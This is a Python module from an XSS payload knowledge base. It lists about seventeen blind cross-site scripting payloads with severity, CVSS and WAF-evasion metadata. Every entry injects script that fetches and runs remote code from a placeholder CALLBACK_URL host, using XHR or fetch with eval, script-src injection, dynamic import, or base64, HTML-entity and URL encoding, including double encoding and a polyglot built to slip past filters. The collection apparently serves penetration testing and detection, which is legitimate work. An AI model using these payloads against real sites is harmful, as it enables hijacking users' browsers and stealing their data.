#!/usr/bin/env python3

"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Created
Telegram: https://t.me/EasyProTech

Blind XSS callback techniques from j4xx3n/PathSegmentXss.
Specialized payloads for out-of-band XSS detection.
Generic callback URL placeholder: CALLBACK_URL
"""

from ..models import AttackSurface, Encoding, PayloadEntry, Reliability, Severity


BLIND_CALLBACK_PAYLOADS = {
    # XMLHttpRequest callback loading - unique technique
    "blind-xhr-callback-load": PayloadEntry(
        payload='<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//CALLBACK_URL");a.send();</script>',
        contexts=["html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Blind XSS using XMLHttpRequest with load event listener for callback.",
        tags=["blind-xss", "xhr", "callback", "exfiltration"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Fetch API with eval
    "blind-fetch-eval": PayloadEntry(
        payload='<script>fetch("//CALLBACK_URL").then(r=>r.text()).then(t=>eval(t))</script>',
        contexts=["html_content", "javascript"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Blind XSS using Fetch API to load and execute remote script.",
        tags=["blind-xss", "fetch", "callback", "modern"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Video source onerror with base64 id
    "blind-video-source-atob": PayloadEntry(
        payload="><video><source onerror=eval(atob(this.id)) id=BASE64_PAYLOAD>",
        contexts=["html_content", "html_attribute"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Blind XSS using video source onerror with base64-encoded payload in id attribute.",
        tags=["blind-xss", "video", "base64", "atob"],
        reliability=Reliability.HIGH,
        encoding=Encoding.BASE64,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Input autofocus with base64 id
    "blind-input-autofocus-atob": PayloadEntry(
        payload='"><input onfocus=eval(atob(this.id)) id=BASE64_PAYLOAD autofocus>',
        contexts=["html_attribute"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Blind XSS using input autofocus with base64-encoded payload in id attribute.",
        tags=["blind-xss", "input", "autofocus", "base64", "atob"],
        reliability=Reliability.HIGH,
        encoding=Encoding.BASE64,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # iframe srcdoc with HTML entities
    "blind-iframe-srcdoc-entities": PayloadEntry(
        payload='"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;CALLBACK_URL&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',
        contexts=["html_attribute"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Blind XSS using iframe srcdoc with HTML decimal entity encoded script loading parent context.",
        tags=["blind-xss", "iframe", "srcdoc", "html-entities", "parent-access"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.HTML_DECIMAL,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Dynamic import with regex source
    "blind-import-regex-source": PayloadEntry(
        payload='javascript:"/*\'/*`/*--></noscript></title></textarea></style></template></noembed></script><html " onmouseover=/*<svg/*/onload=(import(/https:\\CALLBACK_URL/.source))//>"',
        contexts=["url", "javascript"],
        severity=Severity.CRITICAL,
        cvss_score=9.0,
        description="Polyglot blind XSS using dynamic import() with regex source extraction.",
        tags=["blind-xss", "polyglot", "import", "regex", "advanced"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Audio onerror callback
    "blind-audio-onerror-callback": PayloadEntry(
        payload="<audio src=\"x\" onerror=\"var a=document.createElement('script');a.src='https://CALLBACK_URL';document.body.appendChild(a)\">",
        contexts=["html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Blind XSS using audio element onerror to dynamically load callback script.",
        tags=["blind-xss", "audio", "onerror", "callback"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Body onload callback
    "blind-body-onload-callback": PayloadEntry(
        payload="<body onload=\"var a=document.createElement('script');a.src='https://CALLBACK_URL';document.body.appendChild(a)\">",
        contexts=["html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Blind XSS using body onload to dynamically load callback script.",
        tags=["blind-xss", "body", "onload", "callback"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # SVG onload with eval
    "blind-svg-onload-eval": PayloadEntry(
        payload="<svg onload=\"javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://CALLBACK_URL\\';document.body.appendChild(a)')\" />",
        contexts=["html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Blind XSS using SVG onload with eval and dynamic script creation.",
        tags=["blind-xss", "svg", "onload", "eval", "callback"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Div onmouseover callback
    "blind-div-mouseover-callback": PayloadEntry(
        payload="<div onmouseover=\"var a=document.createElement('script');a.src='https://CALLBACK_URL';document.body.appendChild(a)\">Hover me</div>",
        contexts=["html_content"],
        severity=Severity.MEDIUM,
        cvss_score=5.5,
        description="Blind XSS using div onmouseover (requires user interaction).",
        tags=["blind-xss", "div", "mouseover", "callback", "interaction"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # iframe src javascript callback
    "blind-iframe-javascript-callback": PayloadEntry(
        payload="<iframe src=\"javascript:var a=document.createElement('script');a.src='https://CALLBACK_URL';document.body.appendChild(a)\"></iframe>",
        contexts=["html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Blind XSS using iframe with javascript: src for callback.",
        tags=["blind-xss", "iframe", "javascript-protocol", "callback"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.NONE,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # URL-encoded XHR callback
    "blind-xhr-url-encoded": PayloadEntry(
        payload="%3Cscript%3Efunction%20b()%7Beval(this.responseText)%7D;a=new%20XMLHttpRequest();a.addEventListener(%22load%22,%20b);a.open(%22GET%22,%20%22//CALLBACK_URL%22);a.send();%3C/script%3E",
        contexts=["url", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="URL-encoded blind XSS using XMLHttpRequest callback.",
        tags=["blind-xss", "xhr", "url-encoded", "callback"],
        reliability=Reliability.HIGH,
        encoding=Encoding.URL,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # URL-encoded fetch callback
    "blind-fetch-url-encoded": PayloadEntry(
        payload="%3Cscript%3Efetch(%22//CALLBACK_URL%22).then(r=%3Er.text()).then(t=%3Eeval(t))%3C/script%3E",
        contexts=["url", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="URL-encoded blind XSS using Fetch API callback.",
        tags=["blind-xss", "fetch", "url-encoded", "callback"],
        reliability=Reliability.HIGH,
        encoding=Encoding.URL,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Double URL-encoded script
    "blind-double-url-encoded": PayloadEntry(
        payload="%2522%253E%253Cscript%2520src=https://CALLBACK_URL%253E%253C/script%253E",
        contexts=["url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Double URL-encoded blind XSS for bypassing single decode filters.",
        tags=["blind-xss", "double-encode", "url-encoded", "callback"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.DOUBLE_URL,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # jQuery getScript already exists but adding URL-encoded variant
    "blind-jquery-getscript-encoded": PayloadEntry(
        payload="%3Cscript%3E$.getScript(%22//CALLBACK_URL%22)%3C/script%3E",
        contexts=["url", "html_content"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="URL-encoded jQuery getScript for blind XSS callback.",
        tags=["blind-xss", "jquery", "getscript", "url-encoded", "callback"],
        reliability=Reliability.MEDIUM,
        encoding=Encoding.URL,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # Path segment specific - script src breakout
    "blind-path-segment-script-breakout": PayloadEntry(
        payload="'><script src=https://CALLBACK_URL></script>",
        contexts=["html_attribute", "url"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="Path segment XSS breakout with external script for blind callback.",
        tags=["blind-xss", "path-segment", "script-src", "breakout"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
    # JavaScript protocol with createElement
    "blind-javascript-protocol-create": PayloadEntry(
        payload="javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'https://CALLBACK_URL\\';document.body.appendChild(a)')",
        contexts=["url", "href"],
        severity=Severity.HIGH,
        cvss_score=7.5,
        description="JavaScript protocol with dynamic script creation for blind callback.",
        tags=["blind-xss", "javascript-protocol", "eval", "callback"],
        reliability=Reliability.HIGH,
        encoding=Encoding.NONE,
        waf_evasion=True,
        attack_surface=AttackSurface.CLIENT,
    ),
}
